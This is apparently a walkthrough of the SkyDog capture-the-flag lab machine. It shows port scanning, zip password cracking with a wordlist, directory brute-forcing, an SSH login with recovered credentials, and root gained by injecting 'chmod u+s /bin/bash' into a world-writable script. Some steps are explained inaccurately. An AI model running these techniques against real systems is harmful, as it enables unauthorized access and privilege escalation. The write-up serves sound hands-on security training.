@@ -1,0 +1,257 @@
+SkyDog is a very good CTF Con machine.
+IP:192.168.0.101
+
+Lets scan for the ports.
+
+root@LAPTOP-U5913CMD:/home/akshay# nmap -A -T4 -p- 192.168.0.101
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-28 12:26 IST
+Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute
+Traceroute Timing: About 100.00% done; ETC: 12:27 (0:00:00 remaining)
+Nmap scan report for 192.168.0.101
+Host is up (0.0020s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 c8:f7:5b:33:8a:5a:0c:03:bb:6b:af:2d:a9:70:d3:01 (DSA)
+|   2048 01:9f:dd:98:ba:be:de:22:4a:48:4b:be:8d:1a:47:f4 (RSA)
+|   256 f8:a9:65:a5:7c:50:1d:fd:71:57:92:38:8b:ee:8c:0a (ECDSA)
+|_  256 1d:eb:57:4a:b6:23:66:f0:e7:d5:bb:8d:1e:d7:de:23 (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+| http-robots.txt: 252 disallowed entries (15 shown)
+| /search /sdch /groups /catalogs /catalogues /news /nwshp 
+| /setnewsprefs? /index.html? /? /?hl=*& /?hl=*&*&gws_rd=ssl 
+|_/addurl/image? /mail/ /pagead/
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=9/28%OT=22%CT=1%CU=41756%PV=Y%DS=2%DC=T%G=Y%TM=5F71895
+OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS
+OS:(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST1
+OS:1NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN
+OS:(R=Y%DF=Y%T=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
+OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
+OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
+OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
+OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=7FD5%RUD=G)IE(R=Y%DFI=N%T=40
+OS:%CD=S)
+
+Found first flag inside the jpeg image using exiftool.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/SkydogCTF# exiftool SkyDogCon_CTF.jpg 
+ExifTool Version Number         : 12.06
+File Name                       : SkyDogCon_CTF.jpg
+Directory                       : .
+File Size                       : 83 kB
+File Modification Date/Time     : 2015:09:18 17:05:25+05:30
+File Access Date/Time           : 2020:09:28 12:30:35+05:30
+File Inode Change Date/Time     : 2020:09:28 12:30:31+05:30
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : inches
+X Resolution                    : 96
+Y Resolution                    : 96
+Exif Byte Order                 : Big-endian (Motorola, MM)
+Software                        : Adobe ImageReady
+XP Comment                      : flag{abc40a2d4e023b42bd1ff04891549ae2}
+Padding                         : (Binary data 2060 bytes, use -b option to extract)
+Image Width                     : 900
+Image Height                    : 525
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 900x525
+Megapixels                      : 0.472
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/SkydogCTF# 
+
+
+Flag 1 - flag{abc40a2d4e023b42bd1ff04891549ae2}
+
+Found robots.txt with a number of paths and found something at the top of the file.
+
+# Congrats Mr. Bishop, your getting good - flag{cd4f10fcba234f0e8b2f60a490c306e6}
+
+Flag 2 - flag{cd4f10fcba234f0e8b2f60a490c306e6}
+Decoding the flag we get - > Bots
+
+I did a nikto scan and got something interesting.
+http://192.168.0.101/Setec/
+
+After viewing the source I was able to find this thing.
+
+<html>
+<img src="./Astronomy/Setec_Astronomy.jpg" width="1024" height="768" alt="" />
+<!-- 
+<script type="text/javascript">
+var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+try {
+var pageTracker = _gat._getTracker_Approved("NSA-Agent-Abbott"; AKA Darth Vader);
+pageTracker._trackPageview();
+} catch(err) {}</script>
+--> 
+</html>
+
+As you can see the Image is in the Astronomy dir.
+Lets look out the dir.
+There's whislter.zip file in the dir.
+Maybe the another flag is about to come.
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/SkydogCTF# unzip Whistler.zip 
+Archive:  Whistler.zip
+[Whistler.zip] flag.txt password: 
+   skipping: flag.txt                incorrect password
+   skipping: QuesttoFindCosmo.txt    incorrect password
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/SkydogCTF# fcrackzip -D -p /home/akshay/Downloads/rockyou.txt -u Whistler.zip  
+
+
+PASSWORD FOUND!!!!: pw == yourmother
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/SkydogCTF# 
+
+Yeah another flag
+FLAG 3 -> flag{1871a3c1da602bf471d3d76cc60cdb9b} -> yourmother
+
+Time to break out those binoculars and start doing some OSINT
+
+I had to search for the walkthrough this time as I didnot know what to do and found something related to the movie Sneakers.
+
+Then I created namelist using cewl of the official trivia page of the movie.
+
+cewl -d 1 URL -w dict.txt
+
+Then we can bruteforce the directories using dirb
+
+dirb http://192.168.0.101 dict.txt
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/SkydogCTF# dirb http://192.168.0.101 dict.txt 
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Sep 28 13:16:10 2020
+URL_BASE: http://192.168.0.101/
+WORDLIST_FILES: dict.txt
+
+-----------------
+
+GENERATED WORDS: 13275                                                         
+
+---- Scanning URL: http://192.168.0.101/ ----
+==> DIRECTORY: http://192.168.0.101/PlayTronics/                                                                                                                           
+==> DIRECTORY: http://192.168.0.101/Setec/
+
+http://192.168.0.101/PlayTronics/
+
+Found flag.txt
+
+FLAG 4 -> flag{c07908a705c22922e6d416e0e1107d99} -> leroybrown
+
+After downloading the pcap file we can analyze it using wireshark.
+
+After analyzing we found a audio file and after downloading it,the file said one name and that is werner brandes.
+
+That can be the username and password can be the one that was obtained from the flag -> leroybrown
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/SkydogCTF# ssh wernerbrandes@192.168.0.101
+The authenticity of host '192.168.0.101 (192.168.0.101)' can't be established.
+ECDSA key fingerprint is SHA256:kqy1T6FutgFFCnpaLh4rPveQfpTvCPr4VU9WqFRohHM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.0.101' (ECDSA) to the list of known hosts.
+wernerbrandes@192.168.0.101's password: 
+Welcome to Ubuntu 14.04.3 LTS (GNU/Linux 3.19.0-25-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Mon Sep 28 02:51:41 EDT 2020
+
+  System load: 1.31              Memory usage: 3%   Processes:       88
+  Usage of /:  7.3% of 17.34GB   Swap usage:   0%   Users logged in: 0
+
+  Graph this data and manage this system at:
+    https://landscape.canonical.com/
+
+30 packages can be updated.
+21 updates are security updates.
+
+Last login: Fri Oct 30 19:08:28 2015 from 10.0.2.5
+wernerbrandes@skydogctf:~$ id
+uid=1001(wernerbrandes) gid=1001(wernerbrandes) groups=1001(wernerbrandes)
+wernerbrandes@skydogctf:~$ 
+
+
+Noice..:)
+
+wernerbrandes@skydogctf:~$ cat flag.txt
+FLAG 5 -> flag{82ce8d8f5745ff6849fa7af1473c9b35}
+
+We can find some of the files which have SUID bit get using the following command.
+
+find / -writable -type f 2>/dev/nullwernerbrandes@skydogctf:/$ find -writable -type f 2>/dev/null | more
+./lib/log/sanitizer.py
+./proc/sys/kernel/ns_last_pid
+./proc/1/task/1/attr/current
+./proc/1/task/1/attr/exec
+./proc/1/task/1/attr/fscreate
+./proc/1/task/1/attr/keycreate
+./proc/1/task/1/attr/sockcreate
+./proc/1/attr/current
+./proc/1/attr/exec
+./proc/1/attr/fscreate
+./proc/1/attr/keycreate
+./proc/1/attr/sockcreate
+./proc/2/task/2/attr/current
+./proc/2/task/2/attr/exec
+./proc/2/task/2/attr/fscreate
+./proc/2/task/2/attr/keycreate
+./proc/2/task/2/attr/sockcreate
+./proc/2/attr/current
+./proc/2/attr/exec
+./proc/2/attr/fscreate
+./proc/2/attr/keycreate
+
+
+As you can see the sanitizer.py looks interesting.
+
+wernerbrandes@skydogctf:/lib$ cd log
+wernerbrandes@skydogctf:/lib/log$ ls -la sanitizer.py 
+-rwxrwxrwx 1 root root 100 Sep 28 04:25 sanitizer.py
+wernerbrandes@skydogctf:/lib/log$ 
+
+We can write some malicious to get root access.
+
+write "chmod u+s /bin/bash"
+
+and run the script using python
+
+
+wernerbrandes@skydogctf:/lib/log$ python sanitizer.py 
+wernerbrandes@skydogctf:/lib/log$ /bin/bash -p
+bash-4.3# id
+uid=1001(wernerbrandes) gid=1001(wernerbrandes) euid=0(root) groups=0(root),1001(wernerbrandes)
+bash-4.3# 
+
+bash-4.3# cd BlackBox/
+bash-4.3# ls
+flag.txt
+bash-4.3# cat flag.txt
+flag{b70b205c96270be6ced772112e7dd03f}
+
+Congratulations!! Martin Bishop is a free man once again!  Go here to receive your reward.
+/CongratulationsYouDidItbash-4.3# 
+
+FLAG 6 -> flag{b70b205c96270be6ced772112e7dd03f}
+
+It was a great machine to work on pentesting skills.
+
+Thank you..Happy Hacking :)
